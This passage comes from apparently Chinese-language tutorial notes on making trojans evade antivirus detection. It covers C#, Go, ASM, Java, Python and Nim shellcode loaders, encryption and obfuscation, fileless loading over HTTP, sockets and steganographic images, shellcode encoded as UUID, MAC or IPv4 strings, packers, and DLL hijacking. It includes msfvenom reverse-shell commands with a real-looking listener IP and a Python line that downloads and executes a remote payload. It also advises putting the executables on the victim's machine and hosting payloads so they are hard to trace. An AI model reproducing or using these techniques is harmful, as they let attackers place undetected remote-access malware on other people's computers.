($c1+$c2)&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Ladon 混淆命令<br>\n通过 ladon 将 powershell 免杀木马生成为 exe 可执行文件<br>\n通过 ps2exe 生成 exe 文件：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01TY2hvbHRlcy9XaW4tUFMyRVhF\">https://github.com/MScholtes/Win-PS2EXE</span></li>\n</ul>\n<h4 id=\"c-免杀\"><a class=\"markdownIt-Anchor\" href=\"#c-免杀\">#</a> C# 免杀</h4>\n<ul>\n<li>原型木马</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">原型木马</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -e x86/shikata_ga_nai -i 15 -f csharp</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用运行shellcode的C<span class=\"comment\">#脚本运行此代码，生成exe文件测试木马</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>混淆加密<br>\n先用 msf 生成 64 位木马<br>\n用加密脚本进行加密，通过 key 来混淆原型木马获得字节流数据<br>\n再用解密脚本进行解密，用 key 与字节流数据运行脚本进行干扰杀毒检测<br>\n而后打包为 exe 可执行文件测试木马</p>\n</li>\n<li>\n<p>文件混淆<br>\n一些杀毒软件会将木马放置到 VT 或者沙盒中运行，通过行为检测是否是 木马；而 exe 文件本身是支持反编译的，进行逆向可以找到源码中的 shellcode。 沙盒或许能识别到此 shellcode，通过一些软件实现加密原有 exe 程序，干扰杀 毒软件的判断能力。<br>\n开源 - ConfuserEx 通过将原型木马加密<br>\n付费 - VirboxProtector<br>\n 看工具支持哪些语言，如果此工具不支持其他语言，加密后原功能会失效</p>\n</li>\n</ul>\n<h4 id=\"go-免杀\"><a class=\"markdownIt-Anchor\" href=\"#go-免杀\">#</a> Go 免杀</h4>\n<ul>\n<li>原型木马</li>\n</ul>\n<p>通过 cs 生成 c 代码，利用 go 脚本去运行 c 程序<br>\n用运行 shellcode 的 go 脚本运行代码，直接运行或者生成 exe 文件测试木马</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行1.go脚本</span></span><br><span class=\"line\">go run 1.go</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译1.go脚本</span></span><br><span class=\"line\">go build 1.go</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">去弹窗编译1.go脚本</span></span><br><span class=\"line\">go build -ldflags=&quot;-H windowsgui -w -s&quot; 1.go</span><br></pre></td></tr></table></figure>\n<ul>\n<li>分离代码</li>\n</ul>\n<p>如将 shellcode 进行 http 请求获取，或者以参数方式加入，又或者从资源中请求 shellcode<br>\n 准备一个 AES 加密脚本，需要添加 shellcode 为要加密的内容，运行之后会随机生成 key，并利用此 key 将 shellcode 加密后的代码打印出来<br>\n再准备一个 AES 解密脚本，需要输入参数 key 和要执行的代码，此脚本运行之后会利用 key 去解密还原 shellcode，将此 AES 解密脚本打包为 exe 文件</p>\n<ul>\n<li>分离代码 自定义代码</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cs或msf生成raw格式</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写go脚本直接从参数中获取shellcode运行，运行exe程序时设置参数为hex木马</span></span><br><span class=\"line\">go build -ldflags &quot;-s -w -H=windowsgui&quot; 5.go</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>\n<ul>\n<li>分离代码 资源分离</li>\n</ul>\n<p>go 代码中写明要从某个文件获取代码，可以只想 msf/cs 生成的 bin 文件生成 exe 文件之后，将 bin 文件放置代码中指向的目录中执行 exe 就会读取木马并执行</p>\n<ul>\n<li>保护混淆</li>\n</ul>\n<p>通过软件 SafengineShielden 进行保护 混淆 禁止 VT 调试 禁止虚拟机运行等特点</p>\n<h4 id=\"asm-免杀\"><a class=\"markdownIt-Anchor\" href=\"#asm-免杀\">#</a> ASM 免杀</h4>\n<ul>\n<li>内联 C 混编</li>\n</ul>\n<p>通过 c 与 asm 的混合代码来执行 shellcode. 实测情况下对防病毒软件都没有作用</p>\n<ul>\n<li>花指令</li>\n</ul>\n<p>通过相关工具生成 asm 即汇编语言指令，加入到原有的内联 C 代码上干扰需要知道入口地址，通过 ollydeg 工具进行调试，重新打包文件，实测无效。</p>\n<ul>\n<li>编译汇编代码</li>\n</ul>\n<p>来源：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzE1MzY=\">https://forum.butian.net/share/1536</span><br>\n 通过火绒剑抓取运行恶意软件时的进程，查看是否有远程 ip 及端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现30.4.204对应IP地址：</span></span><br><span class=\"line\">30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可以推断出在asm马中</span></span><br><span class=\"line\">30=1, 2f=0, 2d=., 32=3, 33=4, 31=2 </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造ip若为47.94.236.117则马为</span> </span><br><span class=\"line\">33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">端口：</span></span><br><span class=\"line\">82=52h 88=28h</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译器：https://www.masm32.com/</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编译为obj文件：</span></span><br><span class=\"line\">ml /c /coff /Cp test.asm</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成exe文件：</span></span><br><span class=\"line\">link /subsystem:console /libpath:c:\\masm32\\lib test.obj</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在cs上选择http监听器监听端口即可免杀</span> </span><br></pre></td></tr></table></figure>\n<h4 id=\"java-免杀\"><a class=\"markdownIt-Anchor\" href=\"#java-免杀\">#</a> Java 免杀</h4>\n<ul>\n<li>JAR 包原型</li>\n</ul>\n<p>msfvenom -p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f jar -o msf.jar</p>\n<ul>\n<li>JAR 包源码特征修改免杀</li>\n</ul>\n<p>Jar 反编译导出 - jdgui<br>\n 修改上线配置 - config<br>\n 修改启动主类 - MANIFEST.MF<br>\n 修改执行代码 - Main.java<br>\n 打包 class-javac Main.java<br>\n 编译 jar -jar cvfm xiaodi.jar META-INF/MANIFEST.MF .</p>\n<ul>\n<li>JAR 包打包 EXE 执行免杀</li>\n</ul>\n<p>安装：exe4j Inno 进行打包<br>\n exe4j - 下载链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGU0ai5hcHBvbmljLmNvbS8=\">https://exe4j.apponic.com/</span><br>\ninno - 下载链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qcnNvZnR3YXJlLm9yZy9pc2RsLnBocA==\">https://jrsoftware.org/isdl.php</span><br>\n 操作说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yMzYwMDAuaHRt\">https://www.jb51.net/article/236000.htm</span></p>\n<h3 id=\"py-无文件落地\"><a class=\"markdownIt-Anchor\" href=\"#py-无文件落地\">#</a> py 无文件落地</h3>\n<p>是将 shellcode 直接加载进内存，由于没有文件落地，因此可以绕过文件扫 描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申 请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。 分离免杀包含对特征和行为的分离两个维度，把 shellcode 从放在程序转移到加载进内存，把整块的 shellcode 通过分块传输的方法上传然后再拼接，这些体现了基本的 “分离” 思想。</p>\n<h4 id=\"从文本中提取木马\"><a class=\"markdownIt-Anchor\" href=\"#从文本中提取木马\">#</a> 从文本中提取木马</h4>\n<p>从 msf/cs 生成木马，注意需要与自己使用的 python 的版本一致</p>\n<ul>\n<li>读取编码木马文件</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用python将木马转化为base 64 编码</span></span><br><span class=\"line\">print(base64.b64encode(b&#x27;\\xx\\xx\\...\\xx&#x27;))</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将编码后的木马以文件的方式放在一个文件中，s.txt</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用python读取s.txt中的木马并执行</span></span><br><span class=\"line\">s= open(&#x27;s.txt&#x27;,&#x27;r&#x27;).read()</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">再次利用py 2 exe打包py程序</span></span><br><span class=\"line\">python setup py 2 exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将exe可执行程序与s.txt一起放置在对方电脑上，执行即可</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>编码木马文件做混淆</li>\n</ul>\n<p>注意 df 会对 s.txt 内容进行查杀，需要将 s.txt 做一个混淆<br>\n即插入一堆乱字符如 xiaodi，在 py 代码中读取内容后做替换 data = data.replace (‘xiaodi’,’’)<br>\n 再次用 py2exe 打包，切换新的混淆木马即可免杀 df</p>\n<h4 id=\"从参数中提取木马\"><a class=\"markdownIt-Anchor\" href=\"#从参数中提取木马\">#</a> 从参数中提取木马</h4>\n<p>生成的木马，以字节流即 shellcode=b’\\xx\\xx…\\xx ' 的形式赋值<br>\n将木马与执行 py 程序的代码全部合并进行 base 64 编码，编码的作用是为了防止空格回车的影响，可以将全部的程序从参数中读取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编写如下py代码并用p2exe进行打包,使用时将可执行木马的<span class=\"built_in\">base64</span> 编码值从参数中读取</span></span><br><span class=\"line\">import base 64</span><br><span class=\"line\">exec(base64.b64decode(sys.argv[1]))</span><br></pre></td></tr></table></figure>\n<h4 id=\"从http中提取木马\"><a class=\"markdownIt-Anchor\" href=\"#从http中提取木马\">#</a> 从 http 中提取木马</h4>\n<p>同样的将木马即 py 执行木马的代码全部打包放在外部网站上，不建议使用自己的服务器读取编码后的木马，可以使用 oss 存储资源，这对对方的朔源会增。加很大的难度</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py读取代码并同时执行读到的木马程序如下：</span></span><br><span class=\"line\">import base 64</span><br><span class=\"line\">from urllib.request import urlopen</span><br><span class=\"line\">exec(base64.b64decode(urlopen(&#x27;http://www.xxx.com/1.txt&#x27;).read()))</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">打包后将 exe 放置在对方的电脑上即可（可以尝试切换不同的打包起或者请求方式）。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"从socket获取木马\"><a class=\"markdownIt-Anchor\" href=\"#从socket获取木马\">#</a> 从 socket 获取木马</h4>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2VlcC1BbWJpdGlvbi9wLzc0NTkyMTMuaHRtbA==\">https://www.cnblogs.com/Keep-Ambition/p/7459213.html</span></p>\n<p>准备两个文件，一个为 socket.s 服务端代码，一个为 socket.c 客户端代码<br>\n服务端代码负责接收 socket 通信，负责从客户端读取木马并进行解码执行，默认的 socket 通信是有一定的数量限制的，可以采用拼接的方式执行未能正常获取到的木马<br>\n exec (data.decode () + ‘xxxxxxxxxx’)</p>\n<p>服务端需要监听 0.0.0.0 即任意网卡，可以与任意 ip 地址建立连接，准备好服务端的代码通过 py2exe 打包放置在对方电脑上<br>\n本地的 socket.c 文件需要填写上对方的 ip 地址建立通信，一旦通信建立成功，发送木马，就会上线拿下对方主机</p>\n<h4 id=\"从图片中隐写木马\"><a class=\"markdownIt-Anchor\" href=\"#从图片中隐写木马\">#</a> 从图片中隐写木马</h4>\n<p>参考:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYzhVMk1faUo4cFdhSTUwc0g4dTlIdw==\">https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">加密:</span></span><br><span class=\"line\">RGBAencodeDataInImage(im, arguments[&#x27;&lt;text&gt;&#x27;]).save(arguments[&#x27;&lt;encodedImage&gt;&#x27;])</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解密:</span></span><br><span class=\"line\">im = Image.open(arguments[&#x27;&lt;encodedImage&gt;&#x27;])</span><br></pre></td></tr></table></figure>\n<p>通过脚本将需要用 py 执行的木马隐写到图片中，再次通过 py 取读取隐写在图片中的代码并且执行，将加了木马的图片与 py 程序放在同一目录下测试。注意仍需要将木马进行编码，并且用 pyinstaller/py2exe 两者打包都进行尝试。</p>\n<h3 id=\"内存加载免杀\"><a class=\"markdownIt-Anchor\" href=\"#内存加载免杀\">#</a> 内存加载免杀</h3>\n<p>文章参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYyNjY2\">https://www.anquanke.com/post/id/262666</span></p>\n<p>让 shellcode 看上去类似于电脑上自带的东西，伪装成这种数据去调用执行<br>\n我们开辟一块内存，然后直接将 shellcode 写入到对应的内存中并且该内存是可读可写可执行的状态，那么这种方式太容易被 AV 所查杀，因此当我们如果是利用 Windows 自身提供的 API 来将加密或者封装好的 shellcode 写入到内存执行的话，将会大大增加查杀的难度</p>\n<h4 id=\"shellcode转uuid\"><a class=\"markdownIt-Anchor\" href=\"#shellcode转uuid\">#</a> ShellCode 转 UUID</h4>\n<p>通用唯一识别码 (UUID), 是用于计算机体系中以识别信息数目的一个 128 位 标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID 具有唯一 性。</p>\n<p>C++:py 将 shellcode 转为 C++ uuid，C++ 调用 uuid，编译为 exe 执行上线</p>\n<p>C#:py 将 shellcode 转为 C# uuid，C# 调用 uuid，编译为 exe 执行上线</p>\n<p>Py2:py 将 shellcode 转为 py uuid , py2 调用 uuid，pyinstaller 打包</p>\n<p>将 uuid 做分离，使用 http 请求进行无文件落地的内存免杀</p>\n<p>Go:py 将木马转为 go uuid , go 调用 uuid 并进行打包，需去除反 VT</p>\n<p>源码中会对免杀做反虚拟机调试，可以修改源代码删除此部分功能，或者有些特殊情况需要对方不是在虚拟机中执行，可以利用相关工具加保护。</p>\n<h4 id=\"shellcode转mac\"><a class=\"markdownIt-Anchor\" href=\"#shellcode转mac\">#</a> ShellCode 转 MAC</h4>\n<p>MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡 的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算 机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位 (6 个字节) 的。</p>\n<p>Python2: py 将 shellcode 转为 py MAC，py2 调用 MAC 加载，pyinstaller 打包</p>\n<p>Go: py 将 shellcode 转为 go MAC，go 调用 MAC 加载，go build 打包</p>\n<h4 id=\"shellcode转ipv4\"><a class=\"markdownIt-Anchor\" href=\"#shellcode转ipv4\">#</a> ShellCode 转 IPV4</h4>\n<p>IPv4 是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽努力交付数据包，它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4 使用 32 位（ 4 字节）地址。</p>\n<p>Go: py 将 shellcode 转为 go ipv4 ，go 调用 IPV4 加载，并加壳进行保护。</p>\n<h3 id=\"nim-免杀\"><a class=\"markdownIt-Anchor\" href=\"#nim-免杀\">#</a> Nim 免杀</h3>\n<p>nim 编程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NjeE1lcy9Db3JlLU5pbS1wcm9ncmFtbWluZw==\">https://github.com/ScxMes/Core-Nim-programming</span></p>\n<p>nim 安装及上线：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvWUtrQ2NxZWlRTHd5dzRjSnZRSGlsQQ==\">https://mp.weixin.qq.com/s/YKkCcqeiQLwyw4cJvQHilA</span></p>\n<h4 id=\"工具封装木马\"><a class=\"markdownIt-Anchor\" href=\"#工具封装木马\">#</a> 工具封装木马</h4>\n<ul>\n<li>NimShellCodeLoader</li>\n</ul>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FldmVyai9OaW1TaGVsbENvZGVMb2FkZXI=\">https://github.com/aeverj/NimShellCodeLoader</span><br>\n 使用人数过多，已经变成了指纹库，不再具有免杀的特性</p>\n<p>nim 相关编译参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c：编译成C语言，如：nim c test.nim</span><br><span class=\"line\">cpp：编译成C++语言，如：nim cpp test.nim</span><br><span class=\"line\">objc：编译成objc语言</span><br><span class=\"line\">js：编译成javascript脚本, 可以建一个html文件在&lt;script src=&quot;test.js&quot;&gt;&lt;/script&gt;里运行.</span><br><span class=\"line\">-d:release：进行release编译。nim cc -d:release test.nim</span><br><span class=\"line\">-r：编译完成后运行程序</span><br><span class=\"line\">--cincludes：包含当前目录(./)的 c头文件.</span><br><span class=\"line\">--cpu：指定架构，如：nim cc -cpu amd64 , nim cc -cpu:arm。</span><br><span class=\"line\">编译x64：nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim</span><br><span class=\"line\">编译x86：nim c -d:mingw --app:gui --cpu:i386 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim</span><br></pre></td></tr></table></figure>\n<ul>\n<li>OffensiveNim 多种方式加载 shellcode</li>\n</ul>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL09mZmVuc2l2ZU5pbQ==\">https://github.com/byt3bl33d3r/OffensiveNim</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过进程迁移shellcode_fiber.nim</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf/cs生成 64 位的c<span class=\"comment\">#木马，将木马植入到nim代码中，注意nim代码命名中只允许出现英文，不能有-的特殊字符，编译为exe文件</span></span></span><br><span class=\"line\">msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过内联</span></span><br><span class=\"line\">asm shellcode_inline_asm_bin.nim</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">去除多余的代码，用nim加载shellcode并编译为exe</span></span><br><span class=\"line\">msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过创建的挂起进程注入 shellcode_bin.nim</span></span><br><span class=\"line\">msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</span><br></pre></td></tr></table></figure>\n<h4 id=\"无文件落地免杀\"><a class=\"markdownIt-Anchor\" href=\"#无文件落地免杀\">#</a> 无文件落地免杀</h4>\n<ul>\n<li>参数型 nim 脚本</li>\n</ul>\n<p>参数可以选取 bin 后缀的文件或者编码后的 shellcode<br>\n 编译 nim，与 bin 文件一起放入到对方主机中，通常 bin 文件会被查杀</p>\n<ul>\n<li>参数编码型脚本</li>\n</ul>\n<p>以参数形式将 hex 的 shellcode 拼接在 exe 程序后边</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f hex</span><br><span class=\"line\">use multi/handler/exploit</span><br><span class=\"line\">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>\n<ul>\n<li>图片隐写 nim 脚本</li>\n</ul>\n<p>准备两个 nim 脚本，一个的作用是将 payload.bin 通过自己设置的密码隐写，在图片中或者从隐写的图片中还原隐写的内容，另一个是用来利用隐写图片的 nim 脚本</p>\n<p>编译第二个脚本，可以选择从远程 http 获取图片并拼接密码，也可以以文件的方式读取图片。编译好的 exe 放在对方主机中，自己的隐写图片放在远程 服务器上，通过命令行调用 exe 加载远程隐写图片中的木马可以规避杀毒软件。</p>\n<ul>\n<li>通过 socket 建立连接</li>\n</ul>\n<p>类似于 nc 聊天，将客户端给服务端发送命令执行上线木马的命令获取对方<br>\n主机的 shell，可利用 powershell 读取外部 http 的木马。</p>\n<h4 id=\"shellcode转uuid-2\"><a class=\"markdownIt-Anchor\" href=\"#shellcode转uuid-2\">#</a> shellcode 转 uuid</h4>\n<p><code>msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</code></p>\n<p>准备 nim 脚本可以加载 64 位的 uuid，将上述代码转为 uuid 并添加到 nim 脚本中，运行此脚本将会弹出 calc。可以用这个方法将 shellcode 转化为 uuid 执行。</p>\n<h3 id=\"应用层面免杀\"><a class=\"markdownIt-Anchor\" href=\"#应用层面免杀\">#</a> 应用层面免杀</h3>\n<h4 id=\"常见查杀方式理论点\"><a class=\"markdownIt-Anchor\" href=\"#常见查杀方式理论点\">#</a> 常见查杀方式理论点</h4>\n<ul>\n<li>特征码扫描：</li>\n</ul>\n<p>所谓特征码其实就是程序内部的一串或者几串二进制机器码。特征码匹配 工作原理是先总结出某个病毒的特征码，然后在目标文件中搜索看有没有类似 的匹配，如果有匹配就暂定为病毒文件。优点：速度快，配备高性能的扫描引 擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。</p>\n<p>缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不 断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征 代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏， 给用户带来麻烦。</p>\n<ul>\n<li>文件和校验法</li>\n</ul>\n<p>将正常文件 A 的 hash 值保存，然后如果有一个新的 A 文件发送过来计算其 hash 值，如果与正常文件的不同，那么认定为病毒文件。</p>\n<ul>\n<li>沙盒检测</li>\n</ul>\n<p>基于行为的检测，看有没有一些敏感的行为来确定文件是否为病毒。优点是可能发现未知的病毒，缺点是误报相对较高，需要用户参与。</p>\n<ul>\n<li>云查杀</li>\n</ul>\n<p>类似于特征码查杀。只是如果特征码库没有匹配值的时候会把文件上传到云端继续分析，有时候扫描病毒刚扫描出来不是病毒，但过一会儿扫描就是病毒了，这种行为就是云查杀。</p>\n<h4 id=\"特征码花指令与加壳\"><a class=\"markdownIt-Anchor\" href=\"#特征码花指令与加壳\">#</a> 特征码花指令与加壳</h4>\n<ul>\n<li>特征码位置修改</li>\n</ul>\n<p>先生成一个 shellcode，并选取一个语言生成为 exe，此时不免杀但是是一个后门，通过工具提取出防病毒软件的特征码，用 ollydeg 工具对特征码的位置进行修改。</p>\n<p>采用 jmp 的方式跳转到 00 位置，赋予 00 位置为特征码，执行结束后在 call 回原来位置。</p>\n<p>即打乱了原有的执行顺序，来实现了绕过防病毒软件的检测。</p>\n<p>简而言之，特征码区域汇编移动到全 0 区域后用 jmp 调用。</p>\n<ul>\n<li>花指令改入口</li>\n</ul>\n<p>添加花指令重定向修改入口地址从而打乱特征码位置。</p>\n<p>生成随机的花指令代码，通过 ollydeg 添加到 00 位置，并借助其他工具改变入口地址为花指令入口地址，花指令执行结束后再跳转到原木马的入口，实测是已失效。</p>\n<ul>\n<li>对木马加壳</li>\n</ul>\n<p>加壳：通过 UPX 对 pyinstaller 打包的程序进行加壳</p>\n<p>加资源：通过 Restorator 对木马 exe 进行伪装为正常软件的图标及版本信息</p>\n<p>加保护：由 Shielden 等工具在原有 exe 程序之外套一层保护</p>\n<h4 id=\"dll劫持\"><a class=\"markdownIt-Anchor\" href=\"#dll劫持\">#</a> dll 劫持</h4>\n<ul>\n<li>调用加载</li>\n</ul>\n<p>准备 c++ 脚本生成 shellcode 的 dll 程序，用 dll.py 调用 dll 会上线</p>\n<ul>\n<li>白加黑方式导入加载</li>\n</ul>\n<p>寻找白名单的应用程序的软件，这些软件在执行时会调用 dll 文件，将自己 通过 c++ 或者其他语言写的经过免杀处理后的 dll 程序导出，(studyPE) 并绑定 在原先白程序执行时会加载的 dll 上，当对方执行此软件的时候，dll 会被加载，就会上线。</p>\n<p>可以用火绒剑监控软件运行时会加载的 dll 程序</p>\n<ul>\n<li>白加黑方式导出编译 钓鱼操作</li>\n</ul>\n<p>一部分的应用是不能用通过 PE 工具进行导入 dll 程序的，可以自行制作原 白名单应用运行时所加载的 dll。即将自己的 dll 木马添加到原有加载的 dll 上。</p>\n<p>用 